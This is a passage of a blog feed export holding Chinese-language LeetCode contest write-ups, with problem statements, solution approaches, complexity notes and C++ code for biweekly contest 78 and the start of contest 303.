<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 78</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/2/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-78"><a href="#leetcode-biweekly-contest-78" class="headerlink" title="leetcode biweekly contest 78"></a>leetcode biweekly contest 78</h2><p>双周赛的题目质量明显好于周赛。</p>
<h3 id="2269-找到一个数字的-K-美丽值"><a href="#2269-找到一个数字的-K-美丽值" class="headerlink" title="2269. 找到一个数字的 K 美丽值"></a>2269. 找到一个数字的 K 美丽值</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>一个整数 <code>num</code> 的 <code>k</code> 美丽值定义为 <code>num</code> 中符合以下条件的 子字符串 数目：</p>
<ul>
<li>子字符串长度为 <code>k</code> 。</li>
<li>子字符串能整除 <code>num</code> 。</li>
<li>给你整数 <code>num</code> 和 <code>k</code> ，请你返回 <code>num</code> 的 <code>k</code> 美丽值。</li>
</ul>
<p>注意：</p>
<ul>
<li>允许有 前缀 0 。</li>
<li>0 不能整除任何值。</li>
<li>一个 子字符串 是一个字符串里的连续一段字符序列。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 240, k = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：以下是 num 里长度为 k 的子字符串：</span><br><span class="line">- &quot;240&quot; 中的 &quot;24&quot; ：24 能整除 240 。</span><br><span class="line">- &quot;240&quot; 中的 &quot;40&quot; ：40 能整除 240 。</span><br><span class="line">所以，k 美丽值为 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：num = 430043, k = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：以下是 num 里长度为 k 的子字符串：</span><br><span class="line">- &quot;430043&quot; 中的 &quot;43&quot; ：43 能整除 430043 。</span><br><span class="line">- &quot;430043&quot; 中的 &quot;30&quot; ：30 不能整除 430043 。</span><br><span class="line">- &quot;430043&quot; 中的 &quot;00&quot; ：0 不能整除 430043 。</span><br><span class="line">- &quot;430043&quot; 中的 &quot;04&quot; ：4 不能整除 430043 。</span><br><span class="line">- &quot;430043&quot; 中的 &quot;43&quot; ：43 能整除 430043 。</span><br><span class="line">所以，k 美丽值为 2 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= num &lt;= 109</code></li>
<li><code>1 &lt;= k &lt;= num.length</code> （将 <code>num</code> 视为字符串）</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/find-the-k-beauty-of-a-number">https://leetcode.cn/problems/find-the-k-beauty-of-a-number</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历即可
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(\log^2 n)$, 其中 $n$ 为数字。</li>
<li>空间复杂度：$O(\log n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">divisorSubstrings</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        string s = <span class="built_in">to_string</span>(num);</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= s.<span class="built_in">size</span>() - k; i++) &#123;</span><br><span class="line">            <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i; j &lt; i + k; j++) &#123;</span><br><span class="line">                curr = curr * <span class="number">10</span> + s[j] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (curr &gt; <span class="number">0</span> &amp;&amp; (num % curr) == <span class="number">0</span>) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2270-分割数组的方案数"><a href="#2270-分割数组的方案数" class="headerlink" title="2270. 分割数组的方案数"></a>2270. 分割数组的方案数</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始长度为 <code>n </code>的整数数组 <code>nums</code> 。<br>如果以下描述为真，那么 <code>nums</code> 在下标 i 处有一个 合法的分割 ：</p>
<ul>
<li>前 <code>i + 1</code> 个元素的和 大于等于 剩下的 <code>n - i - 1</code> 个元素的和。</li>
<li>下标 <code>i</code> 的右边 至少有一个 元素，也就是说下标 <code>i</code> 满足 <code>0 &lt;= i &lt; n - 1</code> 。<br>请你返回 <code>nums</code> 中的 合法分割 方案数。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [10,4,-8,7]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">总共有 3 种不同的方案可以将 nums 分割成两个非空的部分：</span><br><span class="line">- 在下标 0 处分割 nums 。那么第一部分为 [10] ，和为 10 。第二部分为 [4,-8,7] ，和为 3 。因为 10 &gt;= 3 ，所以 i = 0 是一个合法的分割。</span><br><span class="line">- 在下标 1 处分割 nums 。那么第一部分为 [10,4] ，和为 14 。第二部分为 [-8,7] ，和为 -1 。因为 14 &gt;= -1 ，所以 i = 1 是一个合法的分割。</span><br><span class="line">- 在下标 2 处分割 nums 。那么第一部分为 [10,4,-8] ，和为 6 。第二部分为 [7] ，和为 7 。因为 6 &lt; 7 ，所以 i = 2 不是一个合法的分割。</span><br><span class="line">所以 nums 中总共合法分割方案受为 2 。</span><br></pre></td></tr></table></figure>
<p>例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,3,1,0]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">总共有 2 种 nums 的合法分割：</span><br><span class="line">- 在下标 1 处分割 nums 。那么第一部分为 [2,3] ，和为 5 。第二部分为 [1,0] ，和为 1 。因为 5 &gt;= 1 ，所以 i = 1 是一个合法的分割。</span><br><span class="line">- 在下标 2 处分割 nums 。那么第一部分为 [2,3,1] ，和为 6 。第二部分为 [0] ，和为 0 。因为 6 &gt;= 0 ，所以 i = 2 是一个合法的分割。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 105</code></li>
<li><code>-105 &lt;= nums[i] &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-ways-to-split-array">https://leetcode.cn/problems/number-of-ways-to-split-array</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>前缀和
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>存储前缀和，并按照题目要求方式进行分割即可，对 $j$ 满足 $sum[j] \ge sum[n-1]$ 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为数组中的长度。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为数组的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">waysToSplitArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i+<span class="number">1</span>] = sum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> left = sum[i + <span class="number">1</span>];</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> right = sum[n] - left;</span><br><span class="line">            <span class="keyword">if</span> (left &gt;= right) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2271-毯子覆盖的最多白色砖块数"><a href="#2271-毯子覆盖的最多白色砖块数" class="headerlink" title="2271. 毯子覆盖的最多白色砖块数"></a>2271. 毯子覆盖的最多白色砖块数</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个二维整数数组 <code>tiles</code> ，其中 <code>tiles[i] = [li, ri]</code> ，表示所有在 <code>li &lt;= j &lt;= ri</code> 之间的每个瓷砖位置 j 都被涂成了白色。</p>
<p>同时给你一个整数 <code>carpetLen</code> ，表示可以放在 任何位置 的一块毯子。</p>
<p>请你返回使用这块毯子，最多 可以盖住多少块瓷砖。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：tiles = [[1,5],[10,11],[12,18],[20,25],[30,32]], carpetLen = 10</span><br><span class="line">输出：9</span><br><span class="line">解释：将毯子从瓷砖 10 开始放置。</span><br><span class="line">总共覆盖 9 块瓷砖，所以返回 9 。</span><br><span class="line">注意可能有其他方案也可以覆盖 9 块瓷砖。</span><br><span class="line">可以看出，瓷砖无法覆盖超过 9 块瓷砖。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：tiles = [[10,11],[1,1]], carpetLen = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：将毯子从瓷砖 10 开始放置。</span><br><span class="line">总共覆盖 2 块瓷砖，所以我们返回 2 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= tiles.length &lt;= 5 * 104</code></li>
<li><code>tiles[i].length == 2</code></li>
<li><code>1 &lt;= li &lt;= ri &lt;= 109</code></li>
<li><code>1 &lt;= carpetLen &lt;= 109</code></li>
<li><code>tiles</code> 互相 不会重叠 。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-white-tiles-covered-by-a-carpet">https://leetcode.cn/problems/maximum-white-tiles-covered-by-a-carpet</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口 + 二分查找 + 线段树
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这种类型的题目可以作为典型的带边类题目，非常好的启发思想，可以有多种解法。</li>
</ol>
<ul>
<li><strong>二分查找</strong>：我们知道无论如何摆放，最终最多的覆盖一定是从某个连续区间内的起点或者终点开始摆放，我们依次枚举每个起点 $l_i$，然后利用前缀和与二分查找找到 $[l_i, l_i + carpetLen)$ 这个区间所能覆盖的最多的瓷砖数。<ul>
<li>此时假设 $j$ 个区间的左起点大于等于 $l_i + carpetLen$，则此时可以知道当前覆盖的瓷砖的数目为：<br>$$<br>sum[j-1] - sum[i] + \min(tiles[i][0] + carpetLen, tiles[j-1][1] + 1) - tiles[j-1][0]<br>$$</li>
<li>根据以上递推公式即可。</li>
</ul>
</li>
<li><strong>滑动窗口</strong>: 我们每次枚举窗口的左端点，每次移动窗口即可。可以参考题解的[贪心证明，写的非常详细。</li>
<li><strong>线段树</strong>: 可以用典型的线段树查找 $[l_i,l_i + carpetLen - 1]$ 所能覆盖的瓷砖数即可，我们采用动态线树即可解决这个问题，同样类似的题目还有许多方法可以解决。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$, 其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><ul>
<li>二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumWhiteTiles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; tiles, <span class="type">int</span> carpetLen)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = tiles.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(tiles.<span class="built_in">begin</span>(), tiles.<span class="built_in">end</span>());</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i + <span class="number">1</span>] = sum[i] + tiles[i][<span class="number">1</span>] -tiles[i][<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; target = &#123;tiles[i][<span class="number">0</span>] + carpetLen, <span class="number">0</span>&#125;;</span><br><span class="line">            <span class="type">int</span> j = <span class="built_in">lower_bound</span>(tiles.<span class="built_in">begin</span>(), tiles.<span class="built_in">end</span>(), target) - tiles.<span class="built_in">begin</span>();</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, sum[j<span class="number">-1</span>] - sum[i] + <span class="built_in">min</span>(tiles[i][<span class="number">0</span>] + carpetLen, tiles[j<span class="number">-1</span>][<span class="number">1</span>] + <span class="number">1</span>) - tiles[j<span class="number">-1</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>滑动窗口<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumWhiteTiles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; tiles, <span class="type">int</span> carpetLen)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(tiles.<span class="built_in">begin</span>(), tiles.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> now = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; tiles.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; tiles.<span class="built_in">size</span>() &amp;&amp; tiles[j][<span class="number">1</span>] + <span class="number">1</span> - tiles[i][<span class="number">0</span>] &lt;= carpetLen) &#123;</span><br><span class="line">                now += tiles[j][<span class="number">1</span>] - tiles[j][<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; tiles.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, now + <span class="built_in">max</span>(<span class="number">0</span>, tiles[i][<span class="number">0</span>] + carpetLen - tiles[j][<span class="number">0</span>]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, now);</span><br><span class="line">            &#125;</span><br><span class="line">            now -= tiles[i][<span class="number">1</span>] - tiles[i][<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>线段树<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt; r || end &lt; l) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cnt[idx] == r - l + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (start &lt;= l &amp;&amp; r &lt;= end) &#123;</span><br><span class="line">            cnt[idx] = r - l + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (end &lt;= mid) &#123;</span><br><span class="line">                <span class="built_in">update</span>(start, end, l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (start &gt; mid) &#123;</span><br><span class="line">                <span class="built_in">update</span>(start, end, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">update</span>(start, mid, l, mid, idx * <span class="number">2</span>);</span><br><span class="line">                <span class="built_in">update</span>(mid + <span class="number">1</span>, end, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            cnt[idx] = cnt[idx * <span class="number">2</span>] + cnt[idx * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt; r || end &lt; l) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (start &lt;= l &amp;&amp; r &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span> cnt[idx];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (end &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">query</span>(start, end, l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (start &gt; mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">query</span>(start, end, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">query</span>(start, mid, l, mid, idx * <span class="number">2</span>) + \</span><br><span class="line">                       <span class="built_in">query</span>(mid + <span class="number">1</span>, end, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumWhiteTiles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; tiles, <span class="type">int</span> carpetLen)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = tiles.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">update</span>(tiles[i][<span class="number">0</span>], tiles[i][<span class="number">1</span>], <span class="number">1</span>, <span class="number">1e9</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, <span class="built_in">query</span>(tiles[i][<span class="number">0</span>], <span class="built_in">min</span>(<span class="number">1000000000</span>, tiles[i][<span class="number">0</span>] + carpetLen - <span class="number">1</span>), <span class="number">1</span>, <span class="number">1e9</span>, <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2272-最大波动的子字符串"><a href="#2272-最大波动的子字符串" class="headerlink" title="2272. 最大波动的子字符串"></a>2272. 最大波动的子字符串</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>字符串的 波动 定义为子字符串中出现次数 最多 的字符次数与出现次数 最少 的字符次数之差。</p>
<p>给你一个字符串 <code>s</code> ，它只包含小写英文字母。请你返回 <code>s</code> 里所有 子字符串的 最大波动 值。</p>
<p>子字符串 是一个字符串的一段连续字符序列。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;aababbb&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">所有可能的波动值和它们对应的子字符串如以下所示：</span><br><span class="line">- 波动值为 0 的子字符串：&quot;a&quot; ，&quot;aa&quot; ，&quot;ab&quot; ，&quot;abab&quot; ，&quot;aababb&quot; ，&quot;ba&quot; ，&quot;b&quot; ，&quot;bb&quot; 和 &quot;bbb&quot; 。</span><br><span class="line">- 波动值为 1 的子字符串：&quot;aab&quot; ，&quot;aba&quot; ，&quot;abb&quot; ，&quot;aabab&quot; ，&quot;ababb&quot; ，&quot;aababbb&quot; 和 &quot;bab&quot; 。</span><br><span class="line">- 波动值为 2 的子字符串：&quot;aaba&quot; ，&quot;ababbb&quot; ，&quot;abbb&quot; 和 &quot;babb&quot; 。</span><br><span class="line">- 波动值为 3 的子字符串 &quot;babbb&quot; 。</span><br><span class="line">所以，最大可能波动值为 3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcde&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">s 中没有字母出现超过 1 次，所以 s 中每个子字符串的波动值都是 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= s.length &lt;= 104</code></li>
<li><code>s</code>  只包含小写英文字母。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/substring-with-largest-variance">https://leetcode.cn/problems/substring-with-largest-variance</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目出的还算比较有意思，有点 <code>tricky</code> 的地方不太好做。还是好好参考<a href="https://leetcode.cn/problems/substring-with-largest-variance/solution/by-endlesscheng-5775/">题解</a>。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, 其中 $n$ 为字符串的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><ul>
<li>动态规划<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">largestVariance</span><span class="params">(string &amp;s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> a = <span class="string">&#x27;a&#x27;</span>; a &lt;= <span class="string">&#x27;z&#x27;</span>; ++a)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> b = <span class="string">&#x27;a&#x27;</span>; b &lt;= <span class="string">&#x27;z&#x27;</span>; ++b) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a == b) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> diff = <span class="number">0</span>, diff_with_b = INT_MIN;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> ch : s) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ch == a) &#123;</span><br><span class="line">                        ++diff;</span><br><span class="line">                        ++diff_with_b;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == b) &#123;</span><br><span class="line">                        diff_with_b = --diff;</span><br><span class="line">                        diff = <span class="built_in">max</span>(diff, <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans, diff_with_b);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  conttest 303</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/20/</url>
    <content><![CDATA[<h2 id="leetcode-conttest-303"><a href="#leetcode-conttest-303" class="headerlink" title="leetcode  conttest 303"></a>leetcode  conttest 303</h2><p>周赛这个难度，真心是质量下降太多了。</p>
<h3 id="6124-第一个出现两次的字母"><a href="#6124-第一个出现两次的字母" class="headerlink" title="6124. 第一个出现两次的字母"></a>6124. 第一个出现两次的字母</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个由小写英文字母组成的字符串 <code>s</code> ，请你找出并返回第一个出现 两次 的字母。</p>
<p>注意：</p>
<ul>
<li>如果 <code>a </code>的 第二次 出现比 <code>b</code> 的 第二次 出现在字符串中的位置更靠前，则认为字母 <code>a</code> 在字母 <code>b</code> 之前出现两次。</li>
<li><code>s</code> 包含至少一个出现两次的字母。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abccbaacz&quot;</span><br><span class="line">输出：&quot;c&quot;</span><br><span class="line">解释：</span><br><span class="line">字母 &#x27;a&#x27; 在下标 0 、5 和 6 处出现。</span><br><span class="line">字母 &#x27;b&#x27; 在下标 1 和 4 处出现。</span><br><span class="line">字母 &#x27;c&#x27; 在下标 2 、3 和 7 处出现。</span><br><span class="line">字母 &#x27;z&#x27; 在下标 8 处出现。</span><br><span class="line">字母 &#x27;c&#x27; 是第一个出现两次的字母，因为在所有字母中，&#x27;c&#x27; 第二次出现的下标是最小的。</span><br></pre></td></tr></table></figure>
